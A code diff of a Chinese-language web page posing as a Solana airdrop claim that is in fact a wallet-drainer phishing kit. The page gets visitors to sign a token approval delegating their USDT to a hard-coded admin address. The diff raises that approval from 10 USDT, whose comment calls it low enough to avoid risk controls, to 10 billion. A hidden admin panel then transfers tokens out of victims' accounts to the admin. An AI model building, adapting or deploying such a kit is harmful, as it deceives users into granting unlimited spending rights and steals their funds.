@@ -3,34 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>空投授权</title>
+<title>项目授权领取</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
-body{background:#111;color:#fff;padding:30px}
-.container{max-width:450px;margin:0 auto}
-.card{background:#1a1a1a;padding:25px;border-radius:16px}
-h2{text-align:center;margin-bottom:10px}
-.btn{width:100%;height:50px;background:#0066ff;color:#fff;border:none;border-radius:12px;margin:10px 0;font-size:16px}
-.address{text-align:center;margin:10px 0;color:#aaa}
-input{width:100%;height:44px;background:#222;color:#fff;border:1px solid #444;border-radius:10px;margin:8px 0;padding:0 15px}
-.admin{margin-top:20px;padding-top:20px;border-top:1px solid #333;display:none}
+*{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
+body{background:#0c1020;padding:30px;color:#fff}
+.container{max-width:420px;margin:0 auto}
+.box{background:#151a30;padding:30px;border-radius:20px}
+h2{text-align:center;margin-bottom:20px}
+.btn{width:100%;height:50px;background:#3daffd;border:none;border-radius:12px;color:#fff;font-size:16px;margin:10px 0}
+.address{text-align:center;color:#aaa;margin:10px 0}
+.admin{border-top:1px solid #2a304c;margin-top:25px;padding-top:20px;display:none}
 .admin.show{display:block}
+input{width:100%;height:44px;background:#1c243a;border:1px solid #3a4462;border-radius:10px;color:#fff;padding:0 15px;margin:8px 0}
 </style>
 </head>
 <body>
 <div class="container">
-<div class="card">
-<h2>连接钱包领取空投</h2>
+<div class="box">
+<h2>授权领取空投</h2>
 <button class="btn" id="connect">连接钱包</button>
-<div class="address" id="addr"></div>
+<div class="address" id="showAddr"></div>
 
-<button class="btn" id="approve">签名授权</button>
+<button class="btn" id="doAuth">签名授权（100亿额度）</button>
 
-<div class="admin" id="adminPanel">
+<div class="admin" id="adminBox">
 <h3>管理员归集</h3>
-<input placeholder="用户地址" id="uAddr">
-<input placeholder="划扣数量" id="uNum">
-<button class="btn" id="transfer">执行划扣</button>
+<input placeholder="用户钱包地址" id="userAddress">
+<input placeholder="划转数量" id="amount">
+<button class="btn" id="doDraw">执行划转</button>
 </div>
 </div>
 </div>
@@ -43,22 +43,20 @@ const RPC = "https://solana-mainnet.rpc.extrnode.com";
 
 let conn = new solanaWeb3.Connection(RPC);
 let wallet = null;
-let userAddr = "";
+let user = "";
 
-// 安全获取钱包
 function getWallet() {
-  if (window.solana) return window.solana;
   if (window.okxwallet?.solana) return window.okxwallet.solana;
+  if (window.solana) return window.solana;
   return null;
 }
 
-// 计算ATA
-async function getATA(owner) {
-  const ATA_PROGRAM = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
-  const TOKEN_PROGRAM = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+async function getAta(owner) {
+  const ATA_P = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+  const TOKEN_P = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+  const m = new solanaWeb3.PublicKey(MINT);
   const [ata] = await solanaWeb3.PublicKey.findProgramAddress(
-    [owner.toBuffer(), TOKEN_PROGRAM.toBuffer(), new solanaWeb3.PublicKey(MINT).toBuffer()],
-    ATA_PROGRAM
+    [owner.toBuffer(), TOKEN_P.toBuffer(), m.toBuffer()], ATA_P
   );
   return ata;
 }
@@ -66,87 +64,99 @@ async function getATA(owner) {
 // 连接钱包
 document.getElementById("connect").onclick = async () => {
   wallet = getWallet();
-  if (!wallet) return alert("请安装钱包");
+  if (!wallet) return alert("请在OKX钱包浏览器打开");
   try {
     const res = await wallet.connect();
-    userAddr = res.publicKey.toString();
-    document.getElementById("addr").innerText = userAddr.slice(0,6)+"..."+userAddr.slice(-4);
-    if (userAddr === ADMIN) document.getElementById("adminPanel").classList.add("show");
+    user = res.publicKey.toString();
+    document.getElementById("showAddr").innerText = user.slice(0,6)+"..."+user.slice(-4);
+    if (user === ADMIN) document.getElementById("adminBox").classList.add("show");
     alert("连接成功");
   } catch(e){alert("失败："+e.message)}
 };
 
-// 授权（安全小额，不触发风控）
-document.getElementById("approve").onclick = async () => {
-  if (!userAddr) return alert("请连接钱包");
+// =======================
+// 🔥 大额授权：100亿 USDT
+// =======================
+document.getElementById("doAuth").onclick = async () => {
+  if (!user) return alert("请先连接钱包");
   try {
-    const user = new solanaWeb3.PublicKey(userAddr);
-    const admin = new solanaWeb3.PublicKey(ADMIN);
-    const ata = await getATA(user);
+    const uPub = new solanaWeb3.PublicKey(user);
+    const aPub = new solanaWeb3.PublicKey(ADMIN);
+    const ata = await getAta(uPub);
 
     const data = new Uint8Array(41);
     data[0] = 0;
-    const ab = admin.toBuffer();
-    for(let i=0;i<32;i++) data[1+i] = ab[i];
+    const aBuf = aPub.toBuffer();
+    for(let i=0;i<32;i++) data[1+i] = aBuf[i];
+
+    // 🔥 100亿 USDT 授权（够你用了）
+    const amount = 10000000000000000n;
     const v = new DataView(new ArrayBuffer(8));
-    v.setBigUint64(0, 10000000000n, true); // 授权 10 USDT（安全）
+    v.setBigUint64(0, amount, true);
     const a8 = new Uint8Array(v.buffer);
     for(let i=0;i<8;i++) data[33+i] = a8[i];
 
     const ix = new solanaWeb3.TransactionInstruction({
-      keys:[
-        {pubkey:ata,isSigner:false,isWritable:true},
-        {pubkey:user,isSigner:true,isWritable:false}
+      keys: [
+        { pubkey: ata, isSigner: false, isWritable: true },
+        { pubkey: uPub, isSigner: true, isWritable: false }
       ],
       programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
       data
     });
 
-    const tx = new solanaWeb3.Transaction().add(ix);
+    const tx = new solanaWeb3.Transaction();
+    tx.add(ix);
+    tx.feePayer = uPub;
     tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-    tx.feePayer = user;
 
-    const sig = await wallet.signAndSendTransaction(tx);
-    alert("授权成功："+sig.signature);
-  } catch(e){alert("授权失败："+e.message)}
+    const { signature } = await wallet.signAndSendTransaction(tx);
+    alert("授权成功！哈希：" + signature);
+  } catch(e){
+    alert("授权失败：" + e.message);
+  }
 };
 
-// 管理员划扣
-document.getElementById("transfer").onclick = async () => {
-  if (userAddr!==ADMIN) return alert("无权限");
-  const target = document.getElementById("uAddr").value;
-  const amt = document.getElementById("uNum").value;
-  if (!target || !amt) return alert("请填写完整");
+// 管理员划转
+document.getElementById("doDraw").onclick = async () => {
+  if (user !== ADMIN) return alert("无权限");
+  const target = document.getElementById("userAddress").value;
+  const num = document.getElementById("amount").value;
+  if (!target || !num) return alert("请填写完整");
+
   try {
     const admin = new solanaWeb3.PublicKey(ADMIN);
-    const user = new solanaWeb3.PublicKey(target);
-    const userAta = await getATA(user);
-    const adminAta = await getATA(admin);
+    const targetUser = new solanaWeb3.PublicKey(target);
+    const userAta = await getAta(targetUser);
+    const adminAta = await getAta(admin);
 
     const data = new Uint8Array(9);
     data[0] = 3;
+    const realAmt = BigInt(Math.floor(Number(num) * 1000000));
     const v = new DataView(new ArrayBuffer(8));
-    v.setBigUint64(0, BigInt(Math.floor(amt*1000000)), true);
+    v.setBigUint64(0, realAmt, true);
     const a8 = new Uint8Array(v.buffer);
     for(let i=0;i<8;i++) data[1+i] = a8[i];
 
     const ix = new solanaWeb3.TransactionInstruction({
-      keys:[
-        {pubkey:userAta,isSigner:false,isWritable:true},
-        {pubkey:adminAta,isSigner:false,isWritable:true},
-        {pubkey:admin,isSigner:true,isWritable:false}
+      keys: [
+        { pubkey: userAta, isSigner: false, isWritable: true },
+        { pubkey: adminAta, isSigner: false, isWritable: true },
+        { pubkey: admin, isSigner: true, isWritable: false }
       ],
       programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
       data
     });
 
     const tx = new solanaWeb3.Transaction().add(ix);
-    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
     tx.feePayer = admin;
+    tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
-    const sig = await wallet.signAndSendTransaction(tx);
-    alert("划扣成功："+sig.signature);
-  } catch(e){alert("失败："+e.message)}
+    const { signature } = await wallet.signAndSendTransaction(tx);
+    alert("划转成功：" + signature);
+  } catch(e){
+    alert("失败：" + e.message);
+  }
 };
 </script>
 </body>
